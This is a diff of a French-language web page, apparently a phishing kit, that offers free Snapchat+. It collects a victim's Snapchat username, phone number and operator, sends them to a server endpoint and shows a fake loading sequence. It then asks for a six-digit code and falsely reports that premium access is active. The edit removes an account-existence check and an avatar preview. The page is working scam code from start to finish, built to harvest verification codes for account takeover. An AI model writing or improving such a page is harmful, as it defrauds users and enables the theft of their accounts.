@@ -6,6 +6,7 @@
     <title>Snapchat+ Gratuit</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
+        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #000; color: #fff;
@@ -70,7 +71,9 @@
             transform: translateY(-1px); box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
         }
         .input-icon { margin-right: 12px; font-size: 20px; color: #888; flex-shrink: 0; }
-        .input-field { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 16px; padding: 0; }
+        .input-field {
+            flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 16px; padding: 0;
+        }
         .input-field::placeholder { color: #666; font-weight: 400; }
         select.input-field {
             appearance: none;
@@ -98,7 +101,7 @@
         .progress-circle-container { position: relative; width: 160px; height: 160px; margin: 20px auto 20px; display: flex; justify-content: center; align-items: center; }
         .progress-circle {
             width: 100%; height: 100%; border-radius: 50%;
-            background: conic-gradient(#FFFC00 0% 0%, rgba(255,255,255,0.15) 0% 100%);
+            background: conic-gradient(#FFFC00 0% 0%, rgba(255, 255, 255, 0.15) 0% 100%);
             display: flex; justify-content: center; align-items: center; transition: background 0.4s ease;
         }
         .progress-circle-inner {
@@ -158,8 +161,6 @@
         .success-overlay.show { display: flex; }
         .success-icon { font-size: 80px; color: #00ff00; margin-bottom: 20px; }
         .success-message { font-size: 22px; font-weight: 700; color: #FFFC00; text-align: center; padding: 0 30px; }
-        .snap-avatar { width: 80px; height: 80px; border-radius: 20px; margin: 10px auto; background: #FFFC00; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .snap-avatar img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
@@ -175,7 +176,7 @@
 
     <div class="container">
 
-        
+        <!-- ÉTAPE 1 : Formulaire -->
         <div id="step1" class="step active">
             <div class="snap-logo-container">
                 <div class="snap-logo">
@@ -215,9 +216,6 @@
                         <span class="input-icon">@</span>
                         <input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" required>
                     </div>
-                    <div class="snap-avatar" id="avatarPreview" style="display:none;">
-                        <img id="avatarImg" src="" alt="Avatar">
-                    </div>
                 </div>
 
                 <div class="form-group">
@@ -243,18 +241,13 @@
                     </div>
                 </div>
 
-                <button id="sendBtn" class="submit-button" onclick="submitStep1()">
-                    <i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit
-                </button>
+                <button id="sendBtn" class="submit-button" onclick="submitStep1()"><i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit</button>
             </div>
         </div>
 
-        
+        <!-- ÉTAPE CHARGEMENT AVEC ATTENTE -->
         <div id="loading-advanced" class="step">
             <div class="loading-container-advanced">
-                <div class="snap-avatar" id="loadingAvatarContainer" style="display:none;">
-                    <img id="loadingAvatar" src="" alt="Avatar">
-                </div>
                 <div class="progress-circle-container">
                     <div class="progress-circle" id="progressCircle">
                         <div class="progress-circle-inner">
@@ -286,7 +279,7 @@
             </div>
         </div>
 
-        
+        <!-- ÉTAPE 2 : Code -->
         <div id="step2" class="step">
             <div class="form-section">
                 <h3 class="form-title"><i class="fas fa-lock"></i> Entrez le code</h3>
@@ -301,14 +294,12 @@
                     <input type="text" class="code-digit-input" maxlength="1" id="code6" inputmode="numeric" autocomplete="off">
                 </div>
 
-                <button id="verifyCodeBtn" class="submit-button" onclick="submitStep2()">
-                    <i class="fas fa-check"></i> Vérifier le code
-                </button>
+                <button id="verifyCodeBtn" class="submit-button" onclick="submitStep2()"><i class="fas fa-check"></i> Vérifier le code</button>
             </div>
         </div>
     </div>
 
-    
+    <!-- Bottom Navigation Bar -->
     <div class="bottom-nav">
         <div class="nav-item active"><i class="fas fa-home"></i><span>Accueil</span></div>
         <div class="nav-item"><i class="fas fa-search"></i><span>Recherche</span></div>
@@ -316,7 +307,7 @@
         <div class="nav-item"><i class="fas fa-user"></i><span>Profil</span></div>
     </div>
 
-    
+    <!-- Success overlay -->
     <div id="successOverlay" class="success-overlay">
         <div class="success-icon"><i class="fas fa-check-circle"></i></div>
         <div class="success-message">Code vérifié ! Votre accès Premium est activé.</div>
@@ -325,7 +316,6 @@
     <script>
         let currentId = null;
         let currentSnapchat = '';
-        let currentAvatarUrl = null;
         let animationInterval = null;
         let progressStepIndex = 0;
         const totalProgressSteps = 5;
@@ -335,80 +325,42 @@
             document.getElementById(stepId).classList.add('active');
             window.scrollTo(0, 0);
         }
-
         function updateProgressBar(percent) {
-            const bar = document.getElementById('progressBarFill1');
-            if (bar) bar.style.width = percent + '%';
-        }
-
-        async function verifySnapchatUsername(username) {
-            try {
-                const res = await fetch(`/api/check-snapchat/${encodeURIComponent(username)}`);
-                if (!res.ok) throw new Error('Erreur réseau');
-                return await res.json();
-            } catch (err) {
-                console.error(err);
-                return { exists: false, error: 'Vérification impossible' };
-            }
+            document.getElementById('progressBarFill1').style.width = percent + '%';
         }
 
         async function submitStep1() {
             const snapchatInput = document.getElementById('snapchatInput');
             const phoneInput = document.getElementById('phoneInput');
             const operatorSelect = document.getElementById('operatorSelect');
-            const pseudo = snapchatInput.value.trim();
+            const snapchat = snapchatInput.value.trim();
             const phone = phoneInput.value.trim().replace(/\s+/g, '');
             const operator = operatorSelect.value;
 
-            if (!pseudo || pseudo.length < 3) { alert('Pseudo invalide (min 3 caractères).'); snapchatInput.focus(); return; }
-            if (!/^0[1-9]\d{8}$/.test(phone)) { alert('Numéro invalide (10 chiffres).'); phoneInput.focus(); return; }
-            if (!operator) { alert('Choisis un opérateur.'); operatorSelect.focus(); return; }
+            if (!snapchat || snapchat.length < 3) { alert('Pseudo invalide (min 3 caractères).'); snapchatInput.focus(); return; }
+            if (!/^0[1-9]\d{8}$/.test(phone)) { alert('Numéro de téléphone invalide (10 chiffres).'); phoneInput.focus(); return; }
+            if (!operator) { alert('Veuillez choisir un opérateur.'); operatorSelect.focus(); return; }
 
+            currentSnapchat = snapchat;
             const sendBtn = document.getElementById('sendBtn');
             sendBtn.disabled = true;
-            sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification du pseudo...';
-
-            const check = await verifySnapchatUsername(pseudo);
-            if (!check.exists) {
-                alert(`Le pseudo "${pseudo}" n'existe pas. Vérifie l'orthographe.`);
-                sendBtn.disabled = false;
-                sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
-                snapchatInput.focus();
-                return;
-            }
-
-            currentAvatarUrl = check.avatarUrl;
-            const avatarContainer = document.getElementById('avatarPreview');
-            const avatarImg = document.getElementById('avatarImg');
-            if (currentAvatarUrl) {
-                avatarImg.src = currentAvatarUrl;
-                avatarContainer.style.display = 'flex';
-            } else {
-                avatarContainer.style.display = 'none';
-            }
-
-            currentSnapchat = pseudo;
             sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
 
             try {
                 const res = await fetch('/api/submit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ snapchat: pseudo, phone, operator })
+                    body: JSON.stringify({ snapchat, phone, operator })
                 });
                 const data = await res.json();
                 if (!res.ok || !data.id) throw new Error('Erreur serveur');
                 currentId = data.id;
                 showStep('loading-advanced');
                 document.getElementById('loading-account').textContent = '@' + currentSnapchat;
-                if (currentAvatarUrl) {
-                    document.getElementById('loadingAvatar').src = currentAvatarUrl;
-                    document.getElementById('loadingAvatarContainer').style.display = 'flex';
-                }
                 startAdvancedLoadingAnimation(10);
             } catch (err) {
                 console.error(err);
-                alert('Erreur lors de l\'envoi. Réessaye.');
+                alert('Erreur lors de l\'envoi. Veuillez réessayer.');
                 sendBtn.disabled = false;
                 sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Obtenir Snapchat+ gratuit';
             }
@@ -566,6 +518,7 @@
             });
         }
 
+        // Gestion des champs de code
         document.querySelectorAll('.code-digit-input').forEach((input, index, inputs) => {
             input.addEventListener('input', function(e) {
                 const val = this.value;
